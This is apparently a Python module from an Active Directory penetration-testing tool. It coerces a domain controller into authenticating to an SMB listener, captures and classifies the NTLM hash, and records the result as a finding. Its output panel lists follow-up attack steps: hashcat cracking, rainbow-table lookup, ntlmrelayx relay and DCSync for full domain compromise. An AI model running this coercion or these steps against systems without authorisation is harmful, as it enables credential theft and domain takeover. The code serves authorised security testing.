"""Interactive NTLM capture probes built on reusable listener/trigger services."""

from __future__ import annotations

from datetime import datetime, timezone
import os
import shlex
from typing import Any, Protocol

from adscan_internal import telemetry
from adscan_internal.interaction import is_non_interactive
from adscan_internal.rich_output import (
    confirm_operation,
    mark_sensitive,
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_instruction,
    print_panel,
    print_success,
    print_warning,
)
from adscan_internal.services.ntlm_capture_workflow import (
    NativeCoercionTrigger,
    NativeListenerCapture,
    NtlmCaptureProbeResult,
    looks_like_ntlm_hash,
    run_ntlm_capture_probe,
)
from adscan_internal.services.current_vantage_reachability_service import (
    resolve_targets_from_current_vantage,
)
from adscan_internal.reporting_compat import load_optional_report_service_attr
from adscan_internal.workspaces import domain_subpath
from adscan_internal.workspaces.computers import count_target_file_entries


class NtlmCaptureShell(Protocol):
    """Minimal shell surface used by the NTLM capture probe CLI."""

    myip: str | None
    interface: str | None
    domains_data: dict[str, dict[str, Any]]
    domains_dir: str
    current_workspace_dir: str | None
    type: str | None
    _last_run_command_error: tuple[str, Exception] | None

    def spawn_command(
        self,
        command: list[str],
        *,
        env: dict[str, str] | None = None,
        shell: bool = False,
        stdout: Any = None,
        stderr: Any = None,
        preexec_fn: Any = None,
    ) -> Any:
        """Spawn a command in the background."""
        ...

    def run_command(self, command: Any, *, timeout: int | None = None, **kwargs) -> Any:
        """Run a blocking command."""
        ...

    def save_workspace_data(self) -> bool:
        """Persist workspace state after updating domain metadata."""
        ...


class PreparedNtlmProbe(Protocol):
    """Execution contract for a prepared NTLM probe."""

    domain: str
    pdc_ip: str
    pdc_hostname: str
    username: str
    secret: str


def _probe_coercion_target_reachable(
    targets: list[str],
    *,
    port: int = 445,
    timeout: float = 3.0,
) -> bool | None:
    """Return True if any target accepts a TCP connection on *port*, False if all fail, None if empty."""
    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415
    from adscan_internal.services.network_probe_service import tcp_probe_multi  # noqa: PLC0415

    if not targets:
        return None
    for host in targets:
        if not str(host or "").strip():
            continue
        try:
            result = run_async_sync(tcp_probe_multi(host, [port], timeout=timeout))
            if result.status == "open":
                return True
        except Exception:  # noqa: BLE001
            continue
    return False


def _parse_probe_args(args: str) -> tuple[str | None, int, int, str | None]:
    """Parse ``check_dc_ntlm_auth_type`` arguments."""

    domain: str | None = None
    capture_timeout = 45
    trigger_timeout = 120
    method_filter: str | None = None

    tokens = shlex.split(str(args or ""))
    index = 0
    while index < len(tokens):
        token = tokens[index]
        if token == "--timeout" and index + 1 < len(tokens):
            capture_timeout = int(tokens[index + 1])
            index += 2
            continue
        if token.startswith("--timeout="):
            capture_timeout = int(token.split("=", 1)[1])
            index += 1
            continue
        if token == "--trigger-timeout" and index + 1 < len(tokens):
            trigger_timeout = int(tokens[index + 1])
            index += 2
            continue
        if token.startswith("--trigger-timeout="):
            trigger_timeout = int(token.split("=", 1)[1])
            index += 1
            continue
        if token == "--method" and index + 1 < len(tokens):
            method_filter = tokens[index + 1]
            index += 2
            continue
        if token.startswith("--method="):
            method_filter = token.split("=", 1)[1]
            index += 1
            continue
        if domain is None:
            domain = token
        index += 1

    return domain, capture_timeout, trigger_timeout, method_filter



def _summarize_output(text: str, *, max_lines: int = 12) -> str:
    """Return a compact single-string summary of command output for debug logs."""

    lines = [line.rstrip() for line in str(text or "").splitlines() if line.strip()]
    if not lines:
        return ""
    if len(lines) <= max_lines:
        return "\n".join(lines)
    head_count = max_lines // 2
    tail_count = max_lines - head_count
    summary_lines = lines[:head_count] + ["..."] + lines[-tail_count:]
    return "\n".join(summary_lines)


def _kernel_source_ip_toward(dc_ip: str) -> str | None:
    """Return the kernel-chosen source IP toward *dc_ip* (UDP-connect trick).

    No packets are sent - ``connect()`` on a UDP socket only resolves the route
    and binds the local address. Returns ``None`` on any failure.
    """

    import socket  # noqa: PLC0415

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect((dc_ip, 9))
            return str(sock.getsockname()[0])
    except Exception:  # noqa: BLE001 - heuristic only, never fatal
        return None


def _dc_listener_reachability_warning(
    *,
    listener_ip: str,
    dc_ip: str,
    interface: str | None,
) -> str | None:
    """Return an advisory string when the DC is unlikely to reach the listener.

    Coercion is the one path where the DC initiates the connection back to us,
    so a working us->DC route says nothing about the DC->us return path. This
    flags the high-risk topologies (VPN/pivot interface, the bind IP differing
    from the kernel's source IP toward the DC, RFC1918/public mismatch) so a
    no-capture result is read as INCONCLUSIVE rather than a flat negative.
    Advisory only - never blocks the probe.
    """

    import ipaddress  # noqa: PLC0415

    reasons: list[str] = []

    iface = str(interface or "").strip().lower()
    if iface and any(iface.startswith(prefix) for prefix in ("tun", "tap", "ppp")):
        reasons.append(
            f"the listener is bound to a VPN/pivot interface ({iface}); the PDC almost "
            "certainly has no route back to it"
        )

    kernel_source = _kernel_source_ip_toward(dc_ip)
    if kernel_source and listener_ip and kernel_source != listener_ip:
        reasons.append(
            "the listener bind IP differs from the kernel's source IP toward the DC, so the "
            "advertised address is not the one the DC would route back to"
        )

    try:
        listener_addr = ipaddress.ip_address(listener_ip)
        dc_addr = ipaddress.ip_address(dc_ip)
    except ValueError:
        listener_addr = dc_addr = None

    if listener_addr is not None and dc_addr is not None:
        if listener_addr.is_private != dc_addr.is_private:
            reasons.append(
                "the listener IP and DC IP straddle the private/public boundary, so the DC is "
                "unlikely to have a return route to the listener"
            )
        elif listener_addr.is_private and dc_addr.is_private:
            net_listener = ipaddress.ip_network(f"{listener_ip}/24", strict=False)
            if dc_addr not in net_listener:
                reasons.append(
                    "the listener IP and DC IP are in different /24 subnets; verify routing "
                    "before treating a no-capture result as conclusive"
                )

    if not reasons:
        return None
    return (
        "DC->listener return path may be unreachable: "
        + "; ".join(reasons)
        + ". A no-capture result under this condition is INCONCLUSIVE, not evidence that NTLM "
        "is unavailable - pass an explicit reachable listener IP or establish a pivot."
    )


def _ntlm_disabled_by_posture(shell: NtlmCaptureShell, domain: str) -> bool:
    """Return True when the posture system knows NTLM is disabled for *domain*.

    Consumes the centralized posture constraint only - it does NOT run its own
    NTLM-disabled detection (per the AD-constraints single-source-of-truth
    rule). A no-capture outcome under a known-disabled NTLM posture is a
    hardening positive, not a failed probe.
    """

    from adscan_internal.services.domain_posture import (  # noqa: PLC0415
        ConstraintCategory,
        SignalConfidence,
        TriState,
        get_constraint,
    )

    try:
        constraint = get_constraint(
            shell.domains_data,
            domain=domain,
            category=ConstraintCategory.NTLM_AUTHENTICATION,
        )
    except Exception:  # noqa: BLE001 - posture read must never break the probe
        return False
    return (
        constraint.effective_state == TriState.DISABLED
        and constraint.confidence == SignalConfidence.HIGH
    )


def _prepare_ntlm_probe(
    shell: NtlmCaptureShell, domain: str
) -> PreparedNtlmProbe | None:
    """Validate domain/tool prerequisites and return normalized probe inputs."""

    domain_data = shell.domains_data.get(domain)
    if not isinstance(domain_data, dict):
        print_error(
            f"Domain not found in current context: {mark_sensitive(domain, 'domain')}"
        )
        return None

    if not shell.myip:
        print_error(
            "This probe requires a listener IP. Ensure 'myip' is available."
        )
        return None

    pdc_ip = str(domain_data.get("pdc") or "").strip()
    pdc_hostname = str(domain_data.get("pdc_hostname") or "").strip()
    username = str(domain_data.get("username") or "").strip()
    secret = str(domain_data.get("password") or "").strip()

    if not pdc_ip or not pdc_hostname:
        print_error(
            "PDC IP/hostname missing for this domain. Ensure Phase 1 or DNS discovery populated "
            "'pdc' and 'pdc_hostname'."
        )
        return None

    if not username or not secret:
        print_error(
            "This probe requires authenticated domain credentials in the current domain context."
        )
        return None

    workspace_dir = str(shell.current_workspace_dir or "").strip() or os.getcwd()
    reachability = resolve_targets_from_current_vantage(
        workspace_dir,
        shell.domains_dir,
        domain,
        targets=[pdc_ip, pdc_hostname, f"{pdc_hostname}.{domain}"],
    )
    if reachability.report_available:
        assessment = next(
            (
                item
                for item in reachability.assessments
                if item.requested_target
                in {pdc_ip, pdc_hostname, f"{pdc_hostname}.{domain}"}
                and item.matched
            ),
            None,
        )
        if assessment and not assessment.reachable:
            marked_target = mark_sensitive(pdc_ip, "ip")
            marked_domain = mark_sensitive(domain, "domain")
            print_warning(
                f"Skipping coercion precheck in {marked_domain}: current-vantage reachability does not show the target {marked_target} as reachable."
            )
            if reachability.vantage_mode:
                print_info_debug(
                    "[ntlm-capture] reachability precheck blocked probe: "
                    f"target={marked_target} "
                    f"vantage_mode={mark_sensitive(reachability.vantage_mode, 'text')} "
                    f"report={mark_sensitive(str(reachability.report_path or ''), 'path')}"
                )
            else:
                print_info_debug(
                    "[ntlm-capture] reachability precheck blocked probe: "
                    f"target={marked_target} "
                    f"report={mark_sensitive(str(reachability.report_path or ''), 'path')}"
                )
            print_instruction(
                "Refresh the network reachability inventory from the current vantage or establish a pivot before retrying this coercion."
            )
            return None
        if assessment and assessment.reachable:
            print_info_debug(
                "[ntlm-capture] current-vantage reachability confirms target access: "
                f"target={mark_sensitive(pdc_ip, 'ip')} "
                f"matched_ips={mark_sensitive(','.join(assessment.matched_ips), 'text')} "
                f"report={mark_sensitive(str(reachability.report_path or ''), 'path')}"
            )
        else:
            print_info_debug(
                "[ntlm-capture] current-vantage reachability report did not contain an exact match for "
                f"{mark_sensitive(pdc_ip, 'ip')}; proceeding without a hard block."
            )
    else:
        # No persisted report, do a live TCP probe on the PDC so we don't
        # send coercion traffic to a host that is not reachable from here.
        probe_targets = [t for t in [pdc_ip, f"{pdc_hostname}.{domain}", pdc_hostname] if t]
        live_reachable = _probe_coercion_target_reachable(probe_targets)
        marked_target = mark_sensitive(pdc_ip, "ip")
        if live_reachable is False:
            marked_domain = mark_sensitive(domain, "domain")
            print_warning(
                f"Skipping coercion precheck in {marked_domain}: live TCP probe confirms the target {marked_target} is not reachable from the current vantage."
            )
            print_info_debug(
                "[ntlm-capture] live probe blocked coercion: "
                f"target={marked_target} targets={probe_targets}"
            )
            return None
        print_info_debug(
            "[ntlm-capture] no reachability report; "
            + (
                f"live TCP probe confirmed {marked_target} is reachable."
                if live_reachable
                else f"live TCP probe returned no result for {marked_target}; proceeding."
            )
        )

    advisory = _dc_listener_reachability_warning(
        listener_ip=str(shell.myip or "").strip(),
        dc_ip=pdc_ip,
        interface=getattr(shell, "interface", None),
    )
    if advisory:
        print_warning(f"[~] {advisory}")
        print_info_debug(
            "[ntlm-capture] DC->listener reachability heuristic flagged the return path: "
            f"listener={mark_sensitive(str(shell.myip or ''), 'ip')} "
            f"dc={mark_sensitive(pdc_ip, 'ip')} "
            f"interface={mark_sensitive(str(getattr(shell, 'interface', '') or ''), 'text')}"
        )

    class _Prepared:
        pass

    prepared = _Prepared()
    prepared.domain = domain
    prepared.pdc_ip = pdc_ip
    prepared.pdc_hostname = pdc_hostname
    prepared.username = username
    prepared.secret = secret
    return prepared


def _render_captured_hash_jackpot(
    result: NtlmCaptureProbeResult, *, domain: str
) -> None:
    """Render the verdict-first capture panel when an NTLM authentication is observed."""

    observation = result.observation
    auth_type = result.auth_type or "NTLM"
    if observation is None:
        return

    raw_user = str(observation.raw_user or "").strip()
    if "\\" in raw_user:
        captured_domain, captured_sam = raw_user.split("\\", 1)
    elif "@" in raw_user:
        captured_sam, captured_domain = raw_user.split("@", 1)
    else:
        captured_sam, captured_domain = raw_user, domain

    marked_user = mark_sensitive(captured_sam or raw_user, "user")
    marked_domain = mark_sensitive(captured_domain or domain, "domain")
    marked_auth = mark_sensitive(auth_type, "text")

    lines: list[str] = [
        f"[bold]Verdict[/bold]   [green][+][/green] {marked_auth} authentication captured from coerced PDC",
        f"[bold]Principal[/bold] {marked_user}@{marked_domain}",
    ]
    if auth_type == "NTLMv1":
        lines.append(
            "[bold]Posture[/bold]   [red][!][/red] NTLMv1 from DC machine account — NT hash recovery guaranteed via rainbow tables"
        )
    elif auth_type == "NTLMv2":
        lines.append(
            "[bold]Posture[/bold]   [yellow][~][/yellow] NTLMv2 in use — offline cracking only (hashcat -m 5600)"
        )

    next_lines: list[str] = ["", "[bold]Next:[/bold]"]
    if auth_type == "NTLMv1":
        next_lines.append(
            "  [cyan]>[/cyan] Extract DES ciphertexts: [bold]ntlmv1.py --ntlmv1 <hash>[/bold]"
        )
        next_lines.append(
            "  [cyan]>[/cyan] Query Mandiant rainbow tables (8.6 TB, public): [bold]crackalack_lookup ~/ntlmv1-tables/ ~/DES[/bold]"
        )
        next_lines.append(
            "  [cyan]>[/cyan] NT hash recovered → DCSync for full domain compromise (guaranteed, <12 h on consumer HW)"
        )
    else:
        next_lines.append(
            "  [cyan]>[/cyan] Crack offline with [bold]hashcat -m 5600 hash.txt wordlist.txt -r rules/best64.rule[/bold]"
        )
    next_lines.append(
        "  [cyan]>[/cyan] If SMB signing is unenforced on other hosts, relay with [bold]ntlmrelayx[/bold] instead of cracking"
    )
    next_lines.append(
        "  [cyan]>[/cyan] Inspect the full captured hash in the SMB listener log inside the workspace"
    )

    print_panel(
        "\n".join(lines + next_lines),
        title="[bold]NTLM Capture[/bold] [green]captured[/green]",
        title_align="left",
        border_style="green",
    )


def _render_inbound_connection_diagnostic(result: NtlmCaptureProbeResult) -> None:
    """Render the inbound-connection tally that splits reachability from auth-type.

    This is the diagnostic that makes a "no capture" outcome self-explaining:
    zero inbound connections means the target never routed back to the listener
    (a reachability artifact - the verdict is inconclusive, not a negative);
    one or more inbound connections with no NTLM completed from the PDC is a
    real auth-type / refusal signal.
    """

    inbound = result.inbound
    if inbound.total_connections <= 0:
        print_warning(
            "[~] Listener saw 0 inbound connections during the capture window: the target "
            "never routed back to the listener IP. This no-capture result is INCONCLUSIVE "
            "(reachability), not evidence that NTLM is unavailable."
        )
        print_instruction(
            "Confirm the target has a route back to the listener IP (different subnet, NAT, or "
            "VPN/pivot can break the return path), or pass an explicit reachable listener IP."
        )
        return

    masked_sources = ", ".join(
        str(mark_sensitive(ip, "ip")) for ip in inbound.source_ips
    ) or "unknown source"
    stage_summary = ", ".join(
        f"{stage}={count}" for stage, count in inbound.handshake_stages
    ) or "connected"
    if inbound.ntlm_seen:
        print_warning(
            f"[~] Listener saw {inbound.total_connections} inbound connection(s) "
            f"from {masked_sources}; NTLM was negotiated but no Authenticate completed "
            f"from the PDC machine account (handshake stages: {stage_summary})."
        )
        print_instruction(
            "An inbound NTLM negotiation that never completed points at a non-PDC source, a "
            "Kerberos-preferring client, or auth refusal - not a reachability problem."
        )
    else:
        print_warning(
            f"[~] Listener saw {inbound.total_connections} inbound connection(s) "
            f"from {masked_sources}; none advanced to NTLM (handshake stages: {stage_summary}). "
            "The target reached the listener but did not attempt NTLM."
        )
        print_instruction(
            "The target connected but did not NTLM-auth: the DC may prefer Kerberos or refuse "
            "NTLM. Cross-check with the domain NTLM posture before concluding."
        )


def _render_failed_ntlm_capture_probe(result: NtlmCaptureProbeResult) -> None:
    """Render a precise user-facing explanation for a failed NTLM capture probe."""

    trigger_output = (
        f"{result.trigger_stdout or ''}\n{result.trigger_stderr or ''}".lower()
    )

    if result.reason == "listener_exited_during_capture":
        print_warning(
            "[!] The SMB listener stopped before the capture window completed, so the NTLM probe "
            "result is inconclusive."
        )
        _render_inbound_connection_diagnostic(result)
        return

    if result.trigger_returncode not in (None, 0):
        print_warning(
            f"[!] Native coercion returned code {result.trigger_returncode} and no capture was observed."
        )
        if "status_not_supported" in trigger_output:
            print_instruction(
                "The native coercion trigger reported STATUS_NOT_SUPPORTED. Treat this as a "
                "strong sign that NTLM/SMB auth is disabled or restricted on the target."
            )
        _render_inbound_connection_diagnostic(result)
        return

    print_warning("[-] No NTLM authentication capture was observed from the PDC.")
    _render_inbound_connection_diagnostic(result)
    print_instruction(
        "If other hosts authenticated to the listener during this window, do not attribute "
        "those captures to the PDC unless the captured username matches the PDC computer account."
    )


def _render_ntlm_disabled_finding(domain: str) -> None:
    """Render the no-capture outcome as a positive hardening finding.

    When NTLM is known-disabled by posture, the absence of an NTLM hash from
    the coerced PDC is the expected, secure result - frame it as a hardening
    finding rather than a failed probe so the operator does not misread it.
    """

    marked_domain = mark_sensitive(domain, "domain")
    print_panel(
        (
            "[bold]Verdict[/bold]   [green][+][/green] No NTLM emitted by the coerced PDC - "
            "consistent with NTLM authentication being disabled\n"
            f"[bold]Domain[/bold]    {marked_domain}\n"
            "[bold]Posture[/bold]   [green][+][/green] NTLM disabled (HIGH confidence) - the DC "
            "will not hand an NTLM hash to a coercion listener\n\n"
            "[bold]Interpretation:[/bold] this is a security positive, not a probe failure. "
            "Pivot to Kerberos-based techniques; NTLM relay/coercion-to-hash is not viable here."
        ),
        title="[bold]NTLM Capture[/bold] [green]hardening positive[/green]",
        title_align="left",
        border_style="green",
    )


def _render_no_capture_next_steps(result: NtlmCaptureProbeResult) -> None:
    """Render actionable next steps for no-capture outcomes."""

    trigger_output = (
        f"{result.trigger_stdout or ''}\n{result.trigger_stderr or ''}".lower()
    )

    if result.reason != "capture_not_observed":
        return

    if "status_not_supported" in trigger_output:
        print_instruction(
            "Next: this environment likely blocks NTLM/SMB auth for the trigger path. "
            "Pivot to LDAP-based or HTTP-based coercion if available."
        )
        return

    print_instruction(
        "Next: confirm LLMNR/NBT-NS/SMB reachability to the listener, then retry. "
        "To narrow the trigger surface, pass --method=<name> with a known-working coercion vector."
    )


def _persist_ntlm_probe_result(
    shell: NtlmCaptureShell,
    *,
    domain: str,
    result: NtlmCaptureProbeResult | None,
    status: str,
    reason: str | None,
    reachable_ip_count: int | None = None,
    method_filter: str | None = None,
) -> None:
    """Persist NTLM auth-type probe metadata in ``domains_data`` and workspace JSON."""

    domain_state = shell.domains_data.setdefault(domain, {})
    if not isinstance(domain_state, dict):
        domain_state = {}
        shell.domains_data[domain] = domain_state

    checked_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()
    auth_type = result.auth_type if result and result.success else None
    probe_state = {
        "status": status,
        "auth_type": auth_type,
        "reason": reason,
        "checked_at": checked_at,
        "source": "coerced_pdc_capture",
        "listener_returncode": result.listener_returncode if result else None,
        "listener_expected_stop": result.listener_expected_stop if result else None,
        "trigger_returncode": result.trigger_returncode if result else None,
        "trigger_auth_mode": result.trigger_auth_mode if result else None,
        "attempted_trigger_auth_modes": list(result.attempted_trigger_auth_modes)
        if result
        else [],
        "trigger_error_kind": result.trigger_error_kind if result else None,
        "trigger_error_detail": result.trigger_error_detail if result else None,
        "reachable_ip_count": reachable_ip_count,
        "method_filter": method_filter,
        "workspace_type": str(getattr(shell, "type", "") or "").strip().lower() or None,
    }
    if result is not None:
        inbound = result.inbound
        probe_state["inbound_connection_count"] = inbound.total_connections
        probe_state["inbound_source_ip_count"] = len(inbound.source_ips)
        probe_state["inbound_ntlm_seen"] = inbound.ntlm_seen
    if result and result.observation is not None:
        probe_state["captured_user"] = result.observation.raw_user
        probe_state["capture_version"] = result.observation.ntlm_version

    domain_state["dc_ntlm_auth_type"] = auth_type
    domain_state["dc_ntlm_auth_probe"] = probe_state

    if auth_type in {"NTLMv1", "NTLMv2"}:
        record_technical_finding = load_optional_report_service_attr(
            "record_technical_finding",
            action="Technical finding sync",
            debug_printer=print_info_debug,
            prefix="[ntlm-capture]",
        )
        if callable(record_technical_finding):
            try:
                finding_details = {
                    "observed_auth_type": auth_type,
                    "probe_status": status,
                    "probe_reason": reason,
                    "checked_at": checked_at,
                    "source": "coerced_pdc_capture",
                    "captured_user": probe_state.get("captured_user"),
                    "trigger_auth_mode": probe_state.get("trigger_auth_mode"),
                    "attempted_trigger_auth_modes": ",".join(
                        probe_state.get("attempted_trigger_auth_modes") or []
                    ),
                    "trigger_error_kind": probe_state.get("trigger_error_kind"),
                    "trigger_error_detail": probe_state.get("trigger_error_detail"),
                    "trigger_returncode": probe_state.get("trigger_returncode"),
                    "listener_returncode": probe_state.get("listener_returncode"),
                    "reachable_ip_count": reachable_ip_count,
                    "method_filter": method_filter,
                    "workspace_type": probe_state.get("workspace_type"),
                }
                record_technical_finding(
                    shell,
                    domain,
                    key="ntlmv1_enabled",
                    value=(auth_type == "NTLMv1"),
                    details=finding_details,
                )
            except Exception as exc:  # pragma: no cover - best effort sync
                telemetry.capture_exception(exc)
                print_info_debug(
                    f"[ntlm-capture] Failed to persist NTLM auth-type finding: {exc}"
                )

    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                "[ntlm-capture] failed to persist workspace data after probe update: "
                f"{mark_sensitive(str(exc), 'detail')}"
            )


def _execute_ntlm_capture_probe(
    shell: NtlmCaptureShell,
    *,
    domain: str,
    capture_timeout: int,
    trigger_timeout: int,
    method_filter: str | None,
    reachable_ip_count: int | None = None,
) -> NtlmCaptureProbeResult | None:
    """Run the NTLM auth-type probe and persist the resulting domain metadata."""

    prepared = _prepare_ntlm_probe(shell, domain)
    if prepared is None:
        return None

    ntlm_disabled = _ntlm_disabled_by_posture(shell, domain)
    if ntlm_disabled:
        print_warning(
            f"[~] Domain {mark_sensitive(domain, 'domain')} is known to have NTLM authentication "
            "disabled (posture: HIGH confidence). The PDC will not emit an NTLM hash to a "
            "coercion listener by design - a no-capture result here is a hardening positive, "
            "not a failed probe."
        )

    marked_domain = mark_sensitive(domain, "domain")
    marked_pdc = mark_sensitive(f"{prepared.pdc_hostname}.{domain}", "hostname")
    marked_listener = mark_sensitive(shell.myip, "ip")
    print_info(
        f"[*] Checking NTLM auth type for PDC {marked_pdc} in domain {marked_domain} "
        f"via coerced authentication to listener {marked_listener}"
    )
    if method_filter:
        print_info(f"    Filtering native coercion method: {method_filter}", spacing="none")

    listener = NativeListenerCapture(listen_host=shell.myip)
    trigger = NativeCoercionTrigger()

    expected_user = f"{prepared.pdc_hostname}$"
    try:
        result = run_ntlm_capture_probe(
            listener=listener,
            trigger=trigger,
            target=prepared.pdc_ip,
            listener_ip=shell.myip,
            username=prepared.username,
            secret=prepared.secret,
            domain=domain,
            expected_usernames=[expected_user],
            capture_timeout_seconds=capture_timeout,
            trigger_timeout_seconds=trigger_timeout,
            trigger_auth_mode="smb",
            dc_ip=prepared.pdc_ip,
            method_filter=method_filter,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error running NTLM capture probe.")
        print_exception(show_locals=False, exception=exc)
        _persist_ntlm_probe_result(
            shell,
            domain=domain,
            result=None,
            status="error",
            reason=type(exc).__name__,
            reachable_ip_count=reachable_ip_count,
            method_filter=method_filter,
        )
        return None

    if result.success:
        persisted_status = "captured"
        persisted_reason = result.reason
    elif ntlm_disabled:
        # No NTLM emitted from a DC where NTLM is known-disabled is the expected,
        # positive hardening outcome - record it as a posture finding, not a
        # failed probe.
        persisted_status = "ntlm_disabled_posture"
        persisted_reason = "ntlm_disabled_posture"
    else:
        persisted_status = "checked"
        persisted_reason = result.reason

    _persist_ntlm_probe_result(
        shell,
        domain=domain,
        result=result,
        status=persisted_status,
        reason=persisted_reason,
        reachable_ip_count=reachable_ip_count,
        method_filter=method_filter,
    )

    redacted_command = list(result.trigger_command)
    if not looks_like_ntlm_hash(prepared.secret):
        for index, token in enumerate(redacted_command):
            if token == "-p" and index + 1 < len(redacted_command):
                redacted_command[index + 1] = "[REDACTED]"
    else:
        for index, token in enumerate(redacted_command):
            if token == "--hashes" and index + 1 < len(redacted_command):
                redacted_command[index + 1] = ":[REDACTED]"
    if redacted_command:
        print_info_debug(
            "[ntlm-capture] trigger command: " + " ".join(map(str, redacted_command))
        )
    print_info_debug(
        "[ntlm-capture] trigger auth mode: "
        f"{result.trigger_auth_mode or 'unknown'} "
        f"(attempted={','.join(result.attempted_trigger_auth_modes) or 'none'})"
    )
    print_info_debug(
        f"[ntlm-capture] native coercion returncode: {result.trigger_returncode!r}"
    )
    if result.trigger_error_kind:
        print_info_debug(
            "[ntlm-capture] native coercion error kind: "
            f"{result.trigger_error_kind} ({result.trigger_error_detail or 'n/a'})"
        )
    if result.listener_returncode is not None:
        print_info_debug(
            "[ntlm-capture] listener exited with return code "
            f"{result.listener_returncode!r} (expected_stop={result.listener_expected_stop})"
        )
    if method_filter:
        print_info_debug(
            f"[ntlm-capture] native coercion method filter: {method_filter}"
        )
    should_log_trigger_output = (
        not result.success
        or bool(result.trigger_error_kind)
        or result.trigger_returncode not in (None, 0)
    )
    if should_log_trigger_output and result.trigger_stdout.strip():
        stdout_summary = _summarize_output(result.trigger_stdout)
        print_info_debug(
            "[ntlm-capture] native coercion stdout:\n"
            + str(mark_sensitive(stdout_summary, "text"))
        )
    if should_log_trigger_output and result.trigger_stderr.strip():
        stderr_summary = _summarize_output(result.trigger_stderr)
        print_info_debug(
            "[ntlm-capture] native coercion stderr:\n"
            + str(mark_sensitive(stderr_summary, "text"))
        )

    return result


def _enabled_computer_ip_count(shell: NtlmCaptureShell, domain: str) -> int:
    """Return the number of enabled computer IPs for the current domain."""

    workspace_cwd = shell.current_workspace_dir or os.getcwd()
    targets_file = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        domain,
        "enabled_computers_ips.txt",
    )
    return count_target_file_entries(targets_file)


def run_ntlm_auth_type_quick_win(shell: NtlmCaptureShell, target_domain: str) -> bool:
    """Run the Phase 3 NTLM auth-type quick win and persist its outcome."""

    workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
    reachable_ip_count = _enabled_computer_ip_count(shell, target_domain)
    print_info_debug(
        f"[ntlm-capture] enabled computer IP count for {mark_sensitive(target_domain, 'domain')}: {reachable_ip_count}"
    )

    if workspace_type == "ctf" and reachable_ip_count < 2:
        marked_domain = mark_sensitive(target_domain, "domain")
        print_info(
            f"[~] Skipping DC NTLM auth-type check in {marked_domain}: fewer than 2 enabled computer IPs are available for this domain."
        )
        print_info_debug(
            "[ntlm-capture] CTF quick win skipped because enabled computer IP count "
            f"is {reachable_ip_count} (< 2)."
        )
        _persist_ntlm_probe_result(
            shell,
            domain=target_domain,
            result=None,
            status="skipped",
            reason="ctf_enabled_computer_ip_threshold",
            reachable_ip_count=reachable_ip_count,
        )
        return False

    should_execute = True
    if bool(getattr(shell, "auto", False)) or is_non_interactive(shell=shell):
        print_info("[*] Auto mode detected. Proceeding with DC NTLM auth-type check.")
    else:
        pdc = (
            str(shell.domains_data.get(target_domain, {}).get("pdc") or "").strip()
            or "N/A"
        )
        pdc_hostname = (
            str(
                shell.domains_data.get(target_domain, {}).get("pdc_hostname") or ""
            ).strip()
            or "N/A"
        )
        username = (
            str(shell.domains_data.get(target_domain, {}).get("username") or "").strip()
            or "N/A"
        )
        listener_ip = str(getattr(shell, "myip", "") or "").strip() or "N/A"
        should_execute = confirm_operation(
            operation_name="DC NTLM Auth-Type Check",
            description=(
                "Coerces the PDC to authenticate back to the current listener to "
                "classify NTLMv1 vs NTLMv2."
            ),
            context={
                "Domain": target_domain,
                "PDC": pdc,
                "PDC Hostname": pdc_hostname,
                "Username": username,
                "Listener": listener_ip,
                "Trigger": "Native coercion to SMB listener",
                "OPSEC": "Coercion to a listener may be flagged by Defender for Identity, MDI, or SOC NDR",
            },
            default=True,
            icon="🔐",
        )
    if not should_execute:
        print_info("[~] DC NTLM auth-type check skipped by user.")
        _persist_ntlm_probe_result(
            shell,
            domain=target_domain,
            result=None,
            status="skipped",
            reason="user_declined_prompt",
            reachable_ip_count=reachable_ip_count,
        )
        return False

    result = _execute_ntlm_capture_probe(
        shell,
        domain=target_domain,
        capture_timeout=45,
        trigger_timeout=120,
        method_filter=None,
        reachable_ip_count=reachable_ip_count,
    )
    if result is None:
        return False

    if result.success and result.observation:
        marked_user = mark_sensitive(result.observation.raw_user, "user")
        print_success(
            f"[+] Captured {result.auth_type} authentication from {marked_user} via PDC coercion."
        )
        _render_captured_hash_jackpot(result, domain=target_domain)
        return True

    if _ntlm_disabled_by_posture(shell, target_domain):
        _render_ntlm_disabled_finding(target_domain)
        return False

    _render_failed_ntlm_capture_probe(result)
    _render_no_capture_next_steps(result)
    return False


def run_check_dc_ntlm_auth_type(shell: NtlmCaptureShell, args: str) -> None:
    """Coerce the PDC to authenticate back and classify NTLMv1 vs NTLMv2."""

    domain, capture_timeout, trigger_timeout, method_filter = _parse_probe_args(args)
    if not domain:
        print_error(
            "Usage: check_dc_ntlm_auth_type <domain> [--timeout=<seconds>] "
            "[--trigger-timeout=<seconds>] [--method=<method_name>]"
        )
        return

    result = _execute_ntlm_capture_probe(
        shell,
        domain=domain,
        capture_timeout=capture_timeout,
        trigger_timeout=trigger_timeout,
        method_filter=method_filter,
    )
    if result is None:
        return

    if result.success and result.observation:
        marked_user = mark_sensitive(result.observation.raw_user, "user")
        print_success(
            f"[+] Captured {result.auth_type} authentication from {marked_user} via PDC coercion."
        )
        _render_captured_hash_jackpot(result, domain=domain)
        return

    if _ntlm_disabled_by_posture(shell, domain):
        _render_ntlm_disabled_finding(domain)
        return

    _render_failed_ntlm_capture_probe(result)
    _render_no_capture_next_steps(result)


__all__ = [
    "run_check_dc_ntlm_auth_type",
    "run_ntlm_auth_type_quick_win",
]
